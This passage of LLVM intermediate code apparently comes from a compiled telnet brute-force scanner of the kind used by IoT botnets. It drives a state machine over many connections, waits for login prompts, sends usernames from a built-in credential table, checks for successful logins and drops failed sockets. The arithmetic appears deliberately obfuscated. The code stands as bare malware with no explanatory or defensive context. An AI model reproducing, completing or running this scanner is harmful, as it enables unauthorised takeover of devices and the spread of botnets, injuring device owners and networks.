  %294 = load i32, i32* %293, align 16
  %295 = sdiv i32 %294, 64
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds [16 x i64], [16 x i64]* %289, i64 0, i64 %296
  %298 = load i64, i64* %297, align 8
  %299 = and i64 %298, %288
  %300 = xor i64 %298, %288
  %301 = or i64 %299, %300
  %302 = or i64 %298, %288
  store i64 %301, i64* %297, align 8
  %303 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %303, align 8
  %304 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %304, align 8
  %305 = load i32, i32* %2, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %306
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %307, i32 0, i32 0
  %309 = load i32, i32* %308, align 16
  %310 = sub i32 0, 1
  %311 = sub i32 %309, %310
  %312 = add nsw i32 %309, 1
  %313 = call i32 @select(i32 %311, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %313, i32* %3, align 4
  %314 = load i32, i32* %3, align 4
  %315 = icmp eq i32 %314, 1
  br i1 %315, label %316, label %376

; <label>:316:                                    ; preds = %280
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %317 = load i32, i32* %2, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %318
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %319, i32 0, i32 0
  %321 = load i32, i32* %320, align 16
  %322 = bitcast i32* %7 to i8*
  %323 = call i32 @getsockopt(i32 %321, i32 1, i32 4, i8* %322, i32* %6) #2
  %324 = load i32, i32* %7, align 4
  %325 = icmp ne i32 %324, 0
  br i1 %325, label %326, label %341

; <label>:326:                                    ; preds = %316
  %327 = load i32, i32* %2, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %328
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %329, i32 0, i32 0
  %331 = load i32, i32* %330, align 16
  %332 = call i32 @sclose(i32 %331)
  %333 = load i32, i32* %2, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %334
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %335, i32 0, i32 2
  store i8 0, i8* %336, align 8
  %337 = load i32, i32* %2, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %338
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %339, i32 0, i32 3
  store i8 1, i8* %340, align 1
  br label %375

; <label>:341:                                    ; preds = %316
  %342 = load i32, i32* %2, align 4
  %343 = sext i32 %342 to i64
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %343
  %345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %344, i32 0, i32 0
  %346 = load i32, i32* %345, align 16
  %347 = load i32, i32* %2, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %348
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %349, i32 0, i32 0
  %351 = load i32, i32* %350, align 16
  %352 = call i32 (i32, i32, ...) @fcntl(i32 %351, i32 3, i8* null)
  %353 = xor i32 -2049, -1
  %354 = xor i32 %352, %353
  %355 = and i32 %354, %352
  %356 = and i32 %352, -2049
  %357 = call i32 (i32, i32, ...) @fcntl(i32 %346, i32 4, i32 %355)
  %358 = load i32, i32* %2, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %359
  %361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %360, i32 0, i32 6
  store i32 0, i32* %361, align 4
  %362 = load i32, i32* %2, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %363
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %364, i32 0, i32 7
  store i16 0, i16* %365, align 16
  %366 = load i32, i32* %2, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %367
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %368, i32 0, i32 8
  %370 = load i8*, i8** %369, align 8
  call void @llvm.memset.p0i8.i64(i8* %370, i8 0, i64 1024, i32 1, i1 false)
  %371 = load i32, i32* %2, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %372
  %374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %373, i32 0, i32 2
  store i8 2, i8* %374, align 8
  br label %1122

; <label>:375:                                    ; preds = %326
  br label %395

; <label>:376:                                    ; preds = %280
  %377 = load i32, i32* %3, align 4
  %378 = icmp eq i32 %377, -1
  br i1 %378, label %379, label %394

; <label>:379:                                    ; preds = %376
  %380 = load i32, i32* %2, align 4
  %381 = sext i32 %380 to i64
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %381
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %382, i32 0, i32 0
  %384 = load i32, i32* %383, align 16
  %385 = call i32 @sclose(i32 %384)
  %386 = load i32, i32* %2, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %387
  %389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %388, i32 0, i32 2
  store i8 0, i8* %389, align 8
  %390 = load i32, i32* %2, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %391
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %392, i32 0, i32 3
  store i8 1, i8* %393, align 1
  br label %394

; <label>:394:                                    ; preds = %379, %376
  br label %395

; <label>:395:                                    ; preds = %394, %375
  %396 = load i32, i32* %2, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %397
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %398, i32 0, i32 6
  %400 = load i32, i32* %399, align 4
  %401 = sub i32 0, 5
  %402 = sub i32 %400, %401
  %403 = add i32 %400, 5
  %404 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %405 = icmp ult i32 %402, %404
  br i1 %405, label %406, label %421

; <label>:406:                                    ; preds = %395
  %407 = load i32, i32* %2, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %408
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %409, i32 0, i32 0
  %411 = load i32, i32* %410, align 16
  %412 = call i32 @sclose(i32 %411)
  %413 = load i32, i32* %2, align 4
  %414 = sext i32 %413 to i64
  %415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %414
  %416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %415, i32 0, i32 2
  store i8 0, i8* %416, align 8
  %417 = load i32, i32* %2, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %418
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %419, i32 0, i32 3
  store i8 1, i8* %420, align 1
  br label %421

; <label>:421:                                    ; preds = %406, %395
  br label %1121

; <label>:422:                                    ; preds = %72
  %423 = load i32, i32* %2, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %424
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %425, i32 0, i32 6
  %427 = load i32, i32* %426, align 4
  %428 = icmp eq i32 %427, 0
  br i1 %428, label %429, label %435

; <label>:429:                                    ; preds = %422
  %430 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %431 = load i32, i32* %2, align 4
  %432 = sext i32 %431 to i64
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %432
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %433, i32 0, i32 6
  store i32 %430, i32* %434, align 4
  br label %435

; <label>:435:                                    ; preds = %429, %422
  %436 = load i32, i32* %2, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %437
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %438, i32 0, i32 8
  %440 = load i8*, i8** %439, align 8
  %441 = call i32 @matchPrompt(i8* %440)
  %442 = icmp ne i32 %441, 0
  br i1 %442, label %443, label %448

; <label>:443:                                    ; preds = %435
  %444 = load i32, i32* %2, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %445
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %446, i32 0, i32 2
  store i8 7, i8* %447, align 8
  br label %448

; <label>:448:                                    ; preds = %443, %435
  %449 = load i32, i32* %2, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %450
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %451, i32 0, i32 0
  %453 = load i32, i32* %452, align 16
  %454 = load i32, i32* %2, align 4
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %455
  %457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %456, i32 0, i32 8
  %458 = load i8*, i8** %457, align 8
  %459 = load i32, i32* %2, align 4
  %460 = sext i32 %459 to i64
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %460
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %461, i32 0, i32 7
  %463 = load i16, i16* %462, align 16
  %464 = zext i16 %463 to i32
  %465 = call i32 @readUntil(i32 %453, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.48, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %458, i32 1024, i32 %464)
  %466 = icmp ne i32 %465, 0
  br i1 %466, label %467, label %485

; <label>:467:                                    ; preds = %448
  %468 = load i32, i32* %2, align 4
  %469 = sext i32 %468 to i64
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %469
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %470, i32 0, i32 6
  store i32 0, i32* %471, align 4
  %472 = load i32, i32* %2, align 4
  %473 = sext i32 %472 to i64
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %473
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %474, i32 0, i32 7
  store i16 0, i16* %475, align 16
  %476 = load i32, i32* %2, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %477
  %479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %478, i32 0, i32 8
  %480 = load i8*, i8** %479, align 8
  call void @llvm.memset.p0i8.i64(i8* %480, i8 0, i64 1024, i32 1, i1 false)
  %481 = load i32, i32* %2, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %482
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %483, i32 0, i32 2
  store i8 3, i8* %484, align 8
  br label %1122

; <label>:485:                                    ; preds = %448
  %486 = load i32, i32* %2, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 0
  %490 = load i32, i32* %489, align 16
  %491 = load i32, i32* %2, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %492
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %493, i32 0, i32 8
  %495 = load i8*, i8** %494, align 8
  %496 = load i32, i32* %2, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %497
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %498, i32 0, i32 7
  %500 = load i16, i16* %499, align 16
  %501 = zext i16 %500 to i32
  %502 = call i32 @readUntil(i32 %490, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %495, i32 1024, i32 %501)
  %503 = icmp ne i32 %502, 0
  br i1 %503, label %504, label %522

; <label>:504:                                    ; preds = %485
  %505 = load i32, i32* %2, align 4
  %506 = sext i32 %505 to i64
  %507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %506
  %508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %507, i32 0, i32 6
  store i32 0, i32* %508, align 4
  %509 = load i32, i32* %2, align 4
  %510 = sext i32 %509 to i64
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %510
  %512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %511, i32 0, i32 7
  store i16 0, i16* %512, align 16
  %513 = load i32, i32* %2, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %514
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %515, i32 0, i32 8
  %517 = load i8*, i8** %516, align 8
  call void @llvm.memset.p0i8.i64(i8* %517, i8 0, i64 1024, i32 1, i1 false)
  %518 = load i32, i32* %2, align 4
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %519
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %520, i32 0, i32 2
  store i8 3, i8* %521, align 8
  br label %1122

; <label>:522:                                    ; preds = %485
  %523 = load i32, i32* %2, align 4
  %524 = sext i32 %523 to i64
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %524
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %525, i32 0, i32 0
  %527 = load i32, i32* %526, align 16
  %528 = load i32, i32* %2, align 4
  %529 = sext i32 %528 to i64
  %530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %529
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %530, i32 0, i32 8
  %532 = load i8*, i8** %531, align 8
  %533 = load i32, i32* %2, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %534
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %535, i32 0, i32 7
  %537 = load i16, i16* %536, align 16
  %538 = zext i16 %537 to i32
  %539 = call i32 @readUntil(i32 %527, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %532, i32 1024, i32 %538)
  %540 = icmp ne i32 %539, 0
  br i1 %540, label %541, label %559

; <label>:541:                                    ; preds = %522
  %542 = load i32, i32* %2, align 4
  %543 = sext i32 %542 to i64
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %543
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %544, i32 0, i32 6
  store i32 0, i32* %545, align 4
  %546 = load i32, i32* %2, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %547
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %548, i32 0, i32 7
  store i16 0, i16* %549, align 16
  %550 = load i32, i32* %2, align 4
  %551 = sext i32 %550 to i64
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %551
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %552, i32 0, i32 8
  %554 = load i8*, i8** %553, align 8
  call void @llvm.memset.p0i8.i64(i8* %554, i8 0, i64 1024, i32 1, i1 false)
  %555 = load i32, i32* %2, align 4
  %556 = sext i32 %555 to i64
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %556
  %558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %557, i32 0, i32 2
  store i8 5, i8* %558, align 8
  br label %1122

; <label>:559:                                    ; preds = %522
  %560 = load i32, i32* %2, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %561
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %562, i32 0, i32 8
  %564 = load i8*, i8** %563, align 8
  %565 = call i64 @strlen(i8* %564) #10
  %566 = trunc i64 %565 to i16
  %567 = load i32, i32* %2, align 4
  %568 = sext i32 %567 to i64
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %568
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %569, i32 0, i32 7
  store i16 %566, i16* %570, align 16
  br label %571

; <label>:571:                                    ; preds = %559
  br label %572

; <label>:572:                                    ; preds = %571
  br label %573

; <label>:573:                                    ; preds = %572
  %574 = load i32, i32* %2, align 4
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %575
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %576, i32 0, i32 6
  %578 = load i32, i32* %577, align 4
  %579 = sub i32 0, 20
  %580 = sub i32 %578, %579
  %581 = add i32 %578, 20
  %582 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %583 = icmp ult i32 %580, %582
  br i1 %583, label %584, label %599

; <label>:584:                                    ; preds = %573
  %585 = load i32, i32* %2, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %586
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %587, i32 0, i32 0
  %589 = load i32, i32* %588, align 16
  %590 = call i32 @sclose(i32 %589)
  %591 = load i32, i32* %2, align 4
  %592 = sext i32 %591 to i64
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %592
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %593, i32 0, i32 2
  store i8 0, i8* %594, align 8
  %595 = load i32, i32* %2, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %596
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %597, i32 0, i32 3
  store i8 1, i8* %598, align 1
  br label %599

; <label>:599:                                    ; preds = %584, %573
  br label %1121

; <label>:600:                                    ; preds = %72
  %601 = load i32, i32* %2, align 4
  %602 = sext i32 %601 to i64
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %602
  %604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %603, i32 0, i32 0
  %605 = load i32, i32* %604, align 16
  %606 = load i32, i32* %2, align 4
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %607
  %609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %608, i32 0, i32 4
  %610 = load i8, i8* %609, align 2
  %611 = zext i8 %610 to i64
  %612 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %611
  %613 = load i8*, i8** %612, align 8
  %614 = load i32, i32* %2, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %615
  %617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %616, i32 0, i32 4
  %618 = load i8, i8* %617, align 2
  %619 = zext i8 %618 to i64
  %620 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %619
  %621 = load i8*, i8** %620, align 8
  %622 = call i64 @strlen(i8* %621) #10
  %623 = call i64 @send(i32 %605, i8* %613, i64 %622, i32 16384)
  %624 = icmp slt i64 %623, 0
  br i1 %624, label %625, label %640

; <label>:625:                                    ; preds = %600
  %626 = load i32, i32* %2, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %627
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %628, i32 0, i32 0
  %630 = load i32, i32* %629, align 16
  %631 = call i32 @sclose(i32 %630)
  %632 = load i32, i32* %2, align 4
  %633 = sext i32 %632 to i64
  %634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %633
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %634, i32 0, i32 2
  store i8 0, i8* %635, align 8
  %636 = load i32, i32* %2, align 4
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %637
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %638, i32 0, i32 3
  store i8 1, i8* %639, align 1
  br label %1122

; <label>:640:                                    ; preds = %600
  %641 = load i32, i32* %2, align 4
  %642 = sext i32 %641 to i64
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %642
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %643, i32 0, i32 0
  %645 = load i32, i32* %644, align 16
  %646 = call i64 @send(i32 %645, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i32 0, i32 0), i64 2, i32 16384)
  %647 = icmp slt i64 %646, 0
  br i1 %647, label %648, label %663

; <label>:648:                                    ; preds = %640
  %649 = load i32, i32* %2, align 4
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %650
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %651, i32 0, i32 0
  %653 = load i32, i32* %652, align 16
  %654 = call i32 @sclose(i32 %653)
  %655 = load i32, i32* %2, align 4
  %656 = sext i32 %655 to i64
  %657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %656
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %657, i32 0, i32 2
  store i8 0, i8* %658, align 8
  %659 = load i32, i32* %2, align 4
  %660 = sext i32 %659 to i64
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %660
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %661, i32 0, i32 3
  store i8 1, i8* %662, align 1
  br label %1122

; <label>:663:                                    ; preds = %640
  %664 = load i32, i32* %2, align 4
  %665 = sext i32 %664 to i64
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %665
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %666, i32 0, i32 2
  store i8 4, i8* %667, align 8
  br label %1121

; <label>:668:                                    ; preds = %72
  %669 = load i32, i32* %2, align 4
  %670 = sext i32 %669 to i64
  %671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %670
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %671, i32 0, i32 6
  %673 = load i32, i32* %672, align 4
  %674 = icmp eq i32 %673, 0
  br i1 %674, label %675, label %681

; <label>:675:                                    ; preds = %668
  %676 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %677 = load i32, i32* %2, align 4
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %678
  %680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %679, i32 0, i32 6
  store i32 %676, i32* %680, align 4
  br label %681

; <label>:681:                                    ; preds = %675, %668
  %682 = load i32, i32* %2, align 4
  %683 = sext i32 %682 to i64
  %684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %683
  %685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %684, i32 0, i32 8
  %686 = load i8*, i8** %685, align 8
  %687 = call i32 @matchPrompt(i8* %686)
  %688 = icmp ne i32 %687, 0
  br i1 %688, label %689, label %694

; <label>:689:                                    ; preds = %681
  %690 = load i32, i32* %2, align 4
  %691 = sext i32 %690 to i64
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %691
  %693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %692, i32 0, i32 2
  store i8 7, i8* %693, align 8
  br label %694

; <label>:694:                                    ; preds = %689, %681
  %695 = load i32, i32* %2, align 4
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %696
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %697, i32 0, i32 0
  %699 = load i32, i32* %698, align 16
  %700 = load i32, i32* %2, align 4
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %701
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %702, i32 0, i32 8
  %704 = load i8*, i8** %703, align 8
  %705 = load i32, i32* %2, align 4
  %706 = sext i32 %705 to i64
  %707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %706
  %708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %707, i32 0, i32 7
  %709 = load i16, i16* %708, align 16
  %710 = zext i16 %709 to i32
  %711 = call i32 @readUntil(i32 %699, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %704, i32 1024, i32 %710)
  %712 = icmp ne i32 %711, 0
  br i1 %712, label %713, label %745

; <label>:713:                                    ; preds = %694
  %714 = load i32, i32* %2, align 4
  %715 = sext i32 %714 to i64
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %715
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %716, i32 0, i32 6
  store i32 0, i32* %717, align 4
  %718 = load i32, i32* %2, align 4
  %719 = sext i32 %718 to i64
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %719
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %720, i32 0, i32 7
  store i16 0, i16* %721, align 16
  %722 = load i32, i32* %2, align 4
  %723 = sext i32 %722 to i64
  %724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %723
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %724, i32 0, i32 8
  %726 = load i8*, i8** %725, align 8
  %727 = call i8* @strstr(i8* %726, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0)) #10
  %728 = icmp ne i8* %727, null
  br i1 %728, label %729, label %734

; <label>:729:                                    ; preds = %713
  %730 = load i32, i32* %2, align 4
  %731 = sext i32 %730 to i64
  %732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %731
  %733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %732, i32 0, i32 2
  store i8 5, i8* %733, align 8
  br label %739

; <label>:734:                                    ; preds = %713
  %735 = load i32, i32* %2, align 4
  %736 = sext i32 %735 to i64
  %737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %736
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %737, i32 0, i32 2
  store i8 7, i8* %738, align 8
  br label %739

; <label>:739:                                    ; preds = %734, %729
  %740 = load i32, i32* %2, align 4
  %741 = sext i32 %740 to i64
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %741
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %742, i32 0, i32 8
  %744 = load i8*, i8** %743, align 8
  call void @llvm.memset.p0i8.i64(i8* %744, i8 0, i64 1024, i32 1, i1 false)
  br label %1122

; <label>:745:                                    ; preds = %694
  %746 = load i32, i32* %2, align 4
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %747
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %748, i32 0, i32 8
  %750 = load i8*, i8** %749, align 8
  %751 = call i8* @strstr(i8* %750, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.52, i32 0, i32 0)) #10
  %752 = icmp ne i8* %751, null
  br i1 %752, label %753, label %768

; <label>:753:                                    ; preds = %745
  %754 = load i32, i32* %2, align 4
  %755 = sext i32 %754 to i64
  %756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %755
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %756, i32 0, i32 0
  %758 = load i32, i32* %757, align 16
  %759 = call i32 @sclose(i32 %758)
  %760 = load i32, i32* %2, align 4
  %761 = sext i32 %760 to i64
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %761
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %762, i32 0, i32 2
  store i8 0, i8* %763, align 8
  %764 = load i32, i32* %2, align 4
  %765 = sext i32 %764 to i64
